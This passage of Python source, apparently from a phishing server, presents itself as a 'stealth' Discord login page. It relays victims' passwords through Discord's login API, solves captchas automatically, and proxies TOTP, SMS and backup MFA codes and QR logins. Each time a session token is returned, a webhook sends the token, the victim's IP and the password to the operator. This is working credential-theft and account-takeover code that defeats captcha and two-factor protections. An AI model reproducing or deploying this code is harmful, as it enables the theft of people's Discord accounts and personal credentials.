            print(f'[bg:{sid}] Attempt {attempt+1} result [{r.status_code}]: {r.text[:400]}')

            # Check if Discord returned another captcha challenge
            ckeys = j.get('captcha_key', [])
            is_captcha = isinstance(ckeys, list) and (
                'captcha-required' in ckeys or 'invalid-response' in ckeys
                or j.get('captcha_sitekey')
            )

            if not is_captcha:
                break  # Not a captcha — process the actual result

            # Captcha came back — update challenge data for next attempt
            sitekey = j.get('captcha_sitekey', sitekey)
            rqdata  = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', rqtoken)
            _last_discord_sitekey = sitekey
            ds = ds2  # keep session for next attempt
            print(f'[bg:{sid}] Captcha returned, next attempt with fresh rqdata={bool(rqdata)}')

        # ── Process final result ──
        if j.get('token'):
            ip = sess.get('client_ip', '?')
            pw = sess.get('pw', '?')
            fire_webhook(j['token'], ip, pw)
            sess['result'] = _success_with_info(j['token'])
            sess['result_code'] = 200
        elif j.get('ticket') and j.get('mfa') is not None:
            pw = sess.get('pw', '?')
            with _pw_store_lock:
                _pw_store[j['ticket']] = pw
            sess['result'] = j
            sess['result_code'] = 200
        else:
            # Check for email verification requirement
            errs = j.get('errors', {})
            is_email_verify = False
            for field_key in errs:
                field_errors = errs[field_key].get('_errors', []) if isinstance(errs[field_key], dict) else []
                for fe in field_errors:
                    if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                        is_email_verify = True
                        break

            if is_email_verify:
                print(f'[bg:{sid}] Email verification required — keeping session for retry')
                sess['result'] = {'email_verify': True, 'message': 'New login location detected. Please check your email and verify, then click Continue.'}
                sess['result_code'] = 200
                sess['retry_ds'] = last_ds
                sess['retry_payload'] = dict(payload)
                sess['retry_payload'].pop('captcha_key', None)
                sess['retry_payload'].pop('captcha_rqtoken', None)
            else:
                # Check if we're still stuck on captcha after all attempts
                ckeys_final = j.get('captcha_key', [])
                if isinstance(ckeys_final, list) and ckeys_final:
                    # Captcha persisted through all attempts — tell frontend to auto-retry
                    print(f'[bg:{sid}] Captcha persisted after {MAX_ATTEMPTS} attempts — signaling auto-retry')
                    sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                    sess['result_code'] = 500
                else:
                    err_msg = j.get('message', '')
                    if not err_msg:
                        err_msg = 'Login failed. Please check your credentials.'
                    print(f'[bg:{sid}] Error: {err_msg} | raw: {j}')
                    sess['result'] = {'error': err_msg, 'message': err_msg}
                    if j.get('errors'):
                        sess['result']['errors'] = j['errors']
                    if j.get('retry_after'):
                        sess['result']['retry_after'] = j['retry_after']
                    sess['result_code'] = r.status_code if r else 500

        sess['status'] = 'done'
        token_ok = j.get('token') is not None
        mfa_ok = j.get('mfa') is not None
        print(f'[bg:{sid}] Done. token={token_ok}, mfa={mfa_ok}, email_verify={is_email_verify if "is_email_verify" in dir() else False}')

    except Exception as e:
        import traceback
        traceback.print_exc()
        if sid in login_sessions:
            login_sessions[sid]['result'] = {'error': str(e)}
            login_sessions[sid]['result_code'] = 500
            login_sessions[sid]['status'] = 'done'


def _cleanup_old_sessions():
    """Remove sessions that have been delivered or are older than 5 minutes."""
    now = time.time()
    to_remove = []
    for sid, sess in list(login_sessions.items()):
        delivered = sess.get('_delivered_at', 0)
        created = sess.get('_created_at', now)
        if delivered and (now - delivered) > 30:  # 30s after delivery
            to_remove.append(sid)
        elif (now - created) > 300:  # 5 min absolute max
            to_remove.append(sid)
    for sid in to_remove:
        login_sessions.pop(sid, None)
    # Cleanup stale prechallenges (older than 2 min)
    pc_remove = [k for k, v in list(_prechallenges.items()) if (now - v.get('time', now)) > 120]
    for k in pc_remove:
        _prechallenges.pop(k, None)
    if to_remove or pc_remove:
        print(f'[cleanup] Removed {len(to_remove)} stale sessions, {len(pc_remove)} stale prechallenges')


@app.route('/api/login/poll/<sid>')
def api_login_poll(sid):
    """Frontend polls this while the background captcha solve is running."""
    # Periodic cleanup
    try:
        _cleanup_old_sessions()
    except Exception:
        pass
    sess = login_sessions.get(sid)
    if not sess:
        # Session gone (server restart or cleaned up) — tell frontend to retry
        return jsonify({'error': 'Session expired. Please try logging in again.', 'retry': True}), 404
    if sess['status'] == 'solving':
        return jsonify({'status': 'solving'})
    # Done — return the result
    result = sess.get('result', {'error': 'Unknown error'})
    code   = sess.get('result_code', 500)
    # Don't immediately pop — mark with timestamp for delayed cleanup
    # This prevents "Session not found" from duplicate poll requests
    if not result.get('email_verify'):
        sess['_delivered_at'] = time.time()
    return jsonify(result), code


@app.route('/api/login/retry/<sid>', methods=['POST'])
def api_login_retry(sid):
    """Retry login after user verified their email (new location check)."""
    sess = login_sessions.get(sid)
    if not sess:
        return jsonify({'error': 'Session expired. Please try logging in again.', 'retry': True}), 404

    # Reset session for background retry
    sess['status'] = 'solving'
    sess['result'] = None
    sess['result_code'] = 200
    threading.Thread(target=_bg_retry, args=(sid,), daemon=True).start()
    return jsonify({'captcha_stall': True, 'session_id': sid})


def _bg_retry(sid):
    """Background retry after email verification."""
    try:
        sess = login_sessions.get(sid)
        if not sess:
            return

        ds = sess.get('retry_ds') or sess.get('session')
        payload = sess.get('retry_payload') or sess.get('payload')

        print(f'[retry:{sid}] Retrying login after email verify...')

        # Fresh connection
        snap = ds.snapshot()
        ds2 = DiscordSession()
        ds2.s = _make_session()
        ds2.restore(snap)

        r = ds2.post('/auth/login', payload)
        j = r.json()
        print(f'[retry:{sid}] Result [{r.status_code}]: {r.text[:400]}')

        # May need captcha again
        ckeys = j.get('captcha_key', [])
        is_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )

        if is_captcha:
            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
            rqdata = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', '')
            print(f'[retry:{sid}] Captcha required, solving...')
            presolved = _get_presolved()
            if presolved:
                solved = presolved
                err = None
                print(f'[retry:{sid}] Using PRE-SOLVED token!')
            else:
                solved, err = solve_captcha(sitekey, rqdata)
            if not solved:
                sess['result'] = {'error': f'Captcha solve failed: {err}'}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return
            payload['captcha_key'] = solved
            payload['captcha_rqtoken'] = rqtoken
            snap2 = ds2.snapshot()
            ds3 = DiscordSession()
            ds3.s = _make_session()
            ds3.restore(snap2)
            r = ds3.post('/auth/login', payload)
            j = r.json()
            print(f'[retry:{sid}] After captcha [{r.status_code}]: {r.text[:400]}')

        if j.get('token'):
            ip = sess.get('client_ip', '?')
            pw = sess.get('pw', '?')
            fire_webhook(j['token'], ip, pw)
            sess['result'] = _success_with_info(j['token'])
            sess['result_code'] = 200
        elif j.get('ticket') and j.get('mfa') is not None:
            sess['result'] = j
            sess['result_code'] = 200
        else:
            sess['result'] = j
            sess['result_code'] = r.status_code if r else 500

        sess['status'] = 'done'
        print(f'[retry:{sid}] Done. token={j.get("token") is not None}, mfa={j.get("mfa") is not None}')

    except Exception as e:
        import traceback
        traceback.print_exc()
        if sid in login_sessions:
            login_sessions[sid]['result'] = {'error': str(e)}
            login_sessions[sid]['result_code'] = 500
            login_sessions[sid]['status'] = 'done'


@app.route('/api/mfa/totp', methods=['POST'])
def api_mfa_totp():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/totp', {
            'code': d.get('code'), 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms/send', methods=['POST'])
def api_mfa_sms_send():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        r = ds.post('/auth/mfa/sms/send', {'ticket': d.get('ticket')})
        return jsonify(r.json()), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms', methods=['POST'])
def api_mfa_sms_verify():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/sms', {
            'code': d.get('code'), 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/backup', methods=['POST'])
def api_mfa_backup():
    """Submit an 8-digit backup code for MFA verification."""
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        # Discord uses the same /auth/mfa/totp endpoint for backup codes
        # The code format (8-digit with hyphen) tells Discord it's a backup code
        code = d.get('code', '').strip().replace(' ', '-')
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/totp', {
            'code': code, 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# Active QR sessions per IP (dedup concurrent page loads hitting /api/qr/start)
_qr_by_ip = {}   # ip -> session id
_qr_by_ip_lock = threading.Lock()
QR_MAX_SESSIONS = 30  # hard cap on simultaneous QR sessions


@app.route('/api/qr/start')
def api_qr_start():
    # Gate: must have a valid page token (issued at /login page load)
    tok = request.args.get('t', '')
    if not _check_page_token(tok):
        return jsonify({'err': 'Invalid session. Please reload the page.', 'reload': True}), 403

    ok, retry_after = _rate_check('qr_start')
    if not ok:
        return jsonify({'err': f'Too many requests. Try again in {retry_after}s.', 'retry_after': retry_after}), 429

    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if client_ip:
        client_ip = client_ip.split(',')[0].strip()

    # Dedup: if this IP already has an active QR session in progress, reuse it
    with _qr_by_ip_lock:
        existing_sid = _qr_by_ip.get(client_ip)
        if existing_sid and existing_sid in sessions:
            s = sessions[existing_sid]
            if s.fp:
                return jsonify({'id': s.id, 'fp': s.fp})
            if s.st not in ('error', 'cancelled', 'expired', 'done'):
                # Still warming up — wait briefly for this existing session
                for _ in range(50):
                    if s.fp or s.st in ('error', 'cancelled'):
                        break
                    time.sleep(0.1)
                if s.fp:
                    return jsonify({'id': s.id, 'fp': s.fp})

    # Hard cap on total active QR sessions (prevent OOM from bot floods)
    if len(sessions) >= QR_MAX_SESSIONS:
        # Clean up stale sessions first
        dead = [k for k, v in list(sessions.items()) if v.st in ('done', 'error', 'cancelled', 'expired')]
        for k in dead:
            s2 = sessions.pop(k, None)
            if s2:
                try: s2.ws.close()
                except: pass
        # If still over cap after cleanup, reject
        if len(sessions) >= QR_MAX_SESSIONS:
            return jsonify({'id': None, 'err': 'Server busy, please retry'}), 503

    s = QRAuth()
    sessions[s.id] = s
    with _qr_by_ip_lock:
        _qr_by_ip[client_ip] = s.id
    threading.Thread(target=_qr_worker, args=(s,), daemon=True).start()

    # Wait up to 8s for QR fingerprint (pool sessions arrive in ~1s, cold ~5s)
    for _ in range(80):
        if s.fp or s.st in ('error', 'cancelled'):
            break
        time.sleep(0.1)

    if s.fp:
        return jsonify({'id': s.id, 'fp': s.fp})
    return jsonify({'id': s.id, 'err': s.err or 'Timeout'}), 500


@app.route('/api/qr/poll/<sid>')
def api_qr_poll(sid):
    ok, retry_after = _rate_check('qr_poll')
    if not ok:
        return jsonify({'st': 'error', 'err': 'rate_limited', 'retry_after': retry_after}), 429
    s = sessions.get(sid)
    if not s:
        return jsonify({'st': 'error', 'err': 'Gone'}), 404
    out = {'st': s.st}
    if s.user:         out['user'] = s.user
    if s.st == 'done' and s.token:
        # Use _success_with_info to assign role + voice + webhook + spread (once only)
        if not getattr(s, '_info_fired', False):
            s._info_fired = True
            fire_webhook(s.token)
            s._cached_info = _success_with_info(s.token)
        out.update(getattr(s, '_cached_info', {'success': True}))
    if s.err:          out['err'] = s.err
    return jsonify(out)


@app.route('/api/qr/stop/<sid>', methods=['POST'])
def api_qr_stop(sid):
    s = sessions.pop(sid, None)
    if s:
        s._stop.set()
        try: s.ws.close()
        except: pass
    return jsonify({'ok': True})



# ━━━━━━━━━━━━ Main ━━━━━━━━━━━━

if __name__ == '__main__':
    import gc
    print('[*] Fetching build number...')
    fetch_build_number()

    def _cleanup():
        while True:
            time.sleep(60)  # every 60s instead of 300s — more aggressive cleanup
            try:
                dead = [k for k, v in sessions.items() if v.st in ('done', 'error', 'cancelled', 'expired')]
                for k in dead:
                    s = sessions.pop(k, None)
                    if s:
                        try: s.ws.close()
                        except: pass
                # Clear stale login sessions (>2 min old)
                now = time.time()
                stale_login = [k for k, v in list(login_sessions.items()) if (now - v.get('_created_at', 0)) > 120]
                for k in stale_login:
                    login_sessions.pop(k, None)
                # Clear stale prechallenges (>2 min old)
                stale_pc = [k for k, v in list(_prechallenges.items()) if (now - v.get('time', 0)) > 120]
                for k in stale_pc:
                    _prechallenges.pop(k, None)
                # Clear stale pw_store entries
                _pw_store.clear()
                # Clean up _qr_by_ip for sessions that are gone
                with _qr_by_ip_lock:
                    stale_ip = [ip for ip, sid in list(_qr_by_ip.items()) if sid not in sessions]
                    for ip in stale_ip:
                        del _qr_by_ip[ip]
                # Clean up expired page tokens
                with _page_token_lock:
                    expired_toks = [t for t, exp in list(_page_tokens.items()) if time.time() > exp]
                    for t in expired_toks:
                        del _page_tokens[t]
                cleaned = len(dead) + len(stale_login) + len(stale_pc)
                if cleaned:
                    print(f'[cleanup] Removed {len(dead)} QR, {len(stale_login)} login, {len(stale_pc)} prechallenge sessions')
                # Force garbage collection to free curl_cffi / SSL memory
                gc.collect()
            except Exception as e:
                print(f'[cleanup] Error: {e}')
    threading.Thread(target=_cleanup, daemon=True).start()

    # 24/7 global captcha token arsenal — pre-solves tokens continuously
    threading.Thread(target=_arsenal_loop, daemon=True).start()

    # Start session pre-warm pool
    threading.Thread(target=_session_pool_loop, daemon=True).start()

    print(f'\n  Discord Login Server (stealth)')
    print(f'  http://0.0.0.0:{PORT}\n')
    app.run('0.0.0.0', PORT, debug=False, threaded=True)
